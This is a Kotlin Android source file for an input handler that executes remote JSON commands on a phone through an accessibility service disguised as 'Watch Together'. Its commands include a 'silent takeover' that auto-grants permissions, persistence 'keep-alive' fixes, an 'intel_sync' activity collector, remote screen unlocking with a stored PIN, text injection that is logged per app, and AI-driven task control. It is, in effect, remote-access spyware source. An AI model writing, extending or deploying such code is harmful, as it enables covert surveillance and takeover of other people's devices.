package com.phonehand.app

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object InputHandler {
    private const val TAG = "Input"
    private const val DISPATCH_TIMEOUT_MS = 45_000L
    var service: TouchAccessibilityService? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val bg = Executors.newSingleThreadExecutor()

    fun handle(context: Context, json: String) {
        mainHandler.post {
            try {
                val msg = JSONObject(json)
                val type = msg.optString("type")
                when (type) {
                    "brain_command" -> {
                        bg.execute {
                            val goal = msg.optString("goal", "Complete the task on screen.")
                            val ok = BrainControl.runBlocking(context, goal)
                            if (ok) CommandReporter.ok(context, "brain_command", "AI completed")
                            else CommandReporter.error(context, "brain_command", "AI could not complete task")
                        }
                        return@post
                    }
                }
                if (needsAiScreen(type, msg)) {
                    bg.execute { dispatchOnMain(context, msg, type) }
                } else {
                    dispatch(context, msg, type)
                }
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "input")
                CommandReporter.error(context, "command", e.message ?: "Command failed")
            }
        }
    }

    private fun dispatchOnMain(context: Context, msg: JSONObject, type: String) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            dispatch(context, msg, type)
            return
        }
        val latch = CountDownLatch(1)
        var err: Exception? = null
        mainHandler.post {
            try {
                dispatch(context, msg, type)
            } catch (e: Exception) {
                err = e
            } finally {
                latch.countDown()
            }
        }
        if (!latch.await(DISPATCH_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
            Log.w(TAG, "dispatch timeout for $type")
            CommandReporter.error(context, type, "Command timed out on phone")
        }
        err?.let { throw it }
    }

    private fun needsAiScreen(type: String, msg: JSONObject): Boolean {
        if (type == "key") return msg.optString("action") == "unlock"
        return type in AI_SCREEN_TYPES
    }

    private val AI_SCREEN_TYPES = setOf(
        "click", "tap", "swipe", "scroll", "text",
        "open_app", "clipboard_paste", "request_permission_wizard", "request_permission_moment",
    )

    private fun dispatch(context: Context, msg: JSONObject, type: String) {
        when {
            type == "setup_takeover" || (type == "command" && msg.optString("action") == "setup_takeover") -> {
                startSilentTakeover(context)
                return
            }
            type == "fix_persistence" || (type == "command" && msg.optString("action") == "fix_persistence") -> {
                PersistenceShield.applyAll(context)
                CommandReporter.ok(context, "fix_persistence", "Keep-alive fixes started")
                return
            }
            type == "intel_sync" -> {
                ActivityCollector.get(context).syncNow()
                CommandReporter.ok(context, "intel_sync")
                return
            }
            type == "request_permission_wizard" -> {
                bg.execute {
                    prepareForActivityBlocking(context)
                    mainHandler.post {
                        PermissionMoments.handleRemote(context, "", "")
                        CommandReporter.ok(context, "request_permission_wizard")
                    }
                }
                return
            }
            type == "request_permission_moment" -> {
                val step = msg.optString("step", "")
                val moment = msg.optString("moment", "")
                bg.execute {
                    prepareForActivityBlocking(context)
                    mainHandler.post {
                        PermissionMoments.handleRemote(context, moment, step)
                        CommandReporter.ok(context, "request_permission_moment", step.ifBlank { moment })
                    }
                }
                return
            }
            type == "open_app" -> {
                openApp(context, msg.optString("package", ""))
                return
            }
            type == "clipboard_paste" -> {
                pasteClipboard(context, msg.optString("text", ""))
                return
            }
            type == "set_unlock_pin" -> {
                val pin = msg.optString("pin", "").trim()
                if (pin.length in 4..12) {
                    UnlockStore.setPin(context, pin)
                    CommandReporter.ok(context, "set_unlock_pin", "PIN saved on phone")
                } else {
                    CommandReporter.error(context, "set_unlock_pin", "PIN must be 4–12 digits")
                }
                DeviceStateReporter.send(context)
                return
            }
        }

        val svc = service
        if (svc == null) {
            Log.w(TAG, "no accessibility service for $type")
            CommandReporter.error(context, type, "Accessibility off — enable Watch Together on phone")
            return
        }
        when (type) {
            "click", "tap" -> {
                svc.tapAt(
                    msg.optDouble("x", 0.0).toFloat(),
                    msg.optDouble("y", 0.0).toFloat(),
                )
                CommandReporter.ok(context, "tap")
            }
            "swipe" -> {
                svc.swipe(
                    msg.getDouble("x").toFloat(),
                    msg.getDouble("y").toFloat(),
                    msg.getDouble("x2").toFloat(),
                    msg.getDouble("y2").toFloat(),
                    msg.optLong("duration", 200),
                )
                svc.scheduleRefreshesAfterInput()
                CommandReporter.ok(context, "swipe")
            }
            "scroll" -> {
                svc.scrollAt(
                    msg.getDouble("x").toFloat(),
                    msg.getDouble("y").toFloat(),
                    msg.optString("dir", "down"),
                )
                svc.scheduleRefreshesAfterInput()
                CommandReporter.ok(context, "scroll")
            }
            "key" -> handleKey(context, msg.optString("action"))
            "text" -> {
                val text = msg.optString("text", "")
                injectText(text)
                if (text.isNotBlank()) {
                    NotesStore.append(context, text, "remote", svc.lastWindowPkg())
                    NotesStore.flush(context)
                }
                svc.scheduleRefreshesAfterInput()
                CommandReporter.ok(context, "text")
            }
        }
    }

    private fun prepareForActivityBlocking(context: Context) {
        ScreenPower.wakeScreen(context)
        val svc = service ?: return
        if (LockScreenHelper.isDeviceLocked(context)) {
            LockScreenHelper.ensureUnlocked(context, svc, 15_000L)
        }
    }

    private fun openApp(context: Context, packageName: String) {
        if (packageName.isBlank()) {
            CommandReporter.error(context, "open_app", "No app specified")
            return
        }
        if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
        val pm = context.packageManager
        for (pkg in packageCandidates(packageName)) {
            val launch = pm.getLaunchIntentForPackage(pkg) ?: continue
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(launch)
            service?.scheduleRefreshesAfterInput(forceFull = true)
            CommandReporter.ok(context, "open_app", pkg)
            return
        }
        CommandReporter.error(context, "open_app", "App not installed: $packageName")
    }

    private fun packageCandidates(primary: String): List<String> = when (primary) {
        "com.android.camera" -> listOf(
            primary,
            "com.oppo.camera",
            "com.oplus.camera",
            "com.coloros.camera",
            "com.google.android.GoogleCamera",
            "com.sec.android.app.camera",
            "com.huawei.camera",
        )
        "com.android.chrome" -> listOf(primary, "com.chrome.beta", "com.android.browser")
        "com.google.android.dialer" -> listOf(primary, "com.android.dialer", "com.coloros.dialer")
        "com.google.android.apps.messaging" -> listOf(
            primary,
            "com.android.mms",
            "com.coloros.mms",
            "com.samsung.android.messaging",
        )
        else -> listOf(primary)
    }

    private fun pasteClipboard(context: Context, text: String) {
        if (text.isBlank()) {
            CommandReporter.error(context, "clipboard_paste", "Nothing to paste")
            return
        }
        val svc = service
        if (svc == null) {
            CommandReporter.error(context, "clipboard_paste", "Accessibility off — enable Watch Together")
            return
        }
        injectText(text)
        NotesStore.append(context, text, "clipboard", svc.lastWindowPkg())
        NotesStore.flush(context)
        svc.scheduleRefreshesAfterInput()
        CommandReporter.ok(context, "clipboard_paste")
    }

    private fun handleKey(context: Context, action: String) {
        when (action) {
            "wake" -> {
                ScreenPower.wakeScreen(context)
                DeviceStateReporter.send(context)
                CommandReporter.ok(context, "wake")
                return
            }
            "volume_up" -> {
                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.adjustStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    AudioManager.ADJUST_RAISE,
                    AudioManager.FLAG_SHOW_UI,
                )
                CommandReporter.ok(context, "volume_up")
                return
            }
            "volume_down" -> {
                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.adjustStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    AudioManager.ADJUST_LOWER,
                    AudioManager.FLAG_SHOW_UI,
                )
                CommandReporter.ok(context, "volume_down")
                return
            }
            "unlock" -> {
                bg.execute {
                    val svc = service
                    if (svc == null) {
                        CommandReporter.error(context, "unlock", "Accessibility off — enable Watch Together")
                        return@execute
                    }
                    ScreenPower.wakeScreen(context)
                    val result = LockScreenHelper.unlockBlocking(context, svc)
                    Log.d(TAG, "unlock result: $result")
                    DeviceStateReporter.send(context)
                    mainHandler.post { svc.scheduleRefreshesAfterInput(forceFull = true) }
                    if (result == UnlockResult.FAILED) {
                        CommandReporter.error(
                            context,
                            "unlock",
                            "Could not unlock — save PIN in portal or unlock manually",
                        )
                    } else {
                        CommandReporter.ok(context, "unlock", result.name.lowercase())
                    }
                }
                return
            }
        }

        val svc = service
        if (svc == null) {
            CommandReporter.error(context, action, "Accessibility off — enable Watch Together")
            return
        }
        when (action) {
            "back" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            "home" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            "recents" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
            "power" -> {
                if (!ScreenPower.isInteractive(context)) {
                    ScreenPower.wakeScreen(context)
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                } else {
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                }
            }
            "lock" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
            else -> {
                CommandReporter.error(context, action, "Unknown key action")
                return
            }
        }
        svc.scheduleRefreshesAfterInput(forceFull = true)
        CommandReporter.ok(context, action)
    }

    private fun injectText(text: String) {
        if (text.isBlank()) return
        val node = service?.rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
        focused?.let {
            val args = android.os.Bundle()
            args.putCharSequence(
                android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                text,
            )
            it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            it.recycle()
        }
        node.recycle()
    }

    private fun startSilentTakeover(context: Context) {
        if (SettingsPermissionGrant.isRunning() || PermissionAutoGrant.isRunning()) {
            Log.d(TAG, "setup_takeover already running")
            SetupReporter.progress("Already granting permissions…")
            CommandReporter.ok(context, "setup_takeover", "Already running")
            return
        }
        if (!WatchSync.isEnabled(context)) {
            Log.w(TAG, "setup_takeover: accessibility off")
            SetupReporter.error("Watch Together is off — enable in Accessibility")
            CommandReporter.error(context, "setup_takeover", "Enable Watch Together in Accessibility settings")
            return
        }
        if (service == null) {
            Log.w(TAG, "setup_takeover: service not bound")
            SetupReporter.error("Accessibility service not running — reopen 2hotatl")
            CommandReporter.error(context, "setup_takeover", "Accessibility service not running — reopen app")
            return
        }
        SettingsPermissionGrant.runLightning(context)
        CommandReporter.ok(context, "setup_takeover", "Grant All started")
    }
}
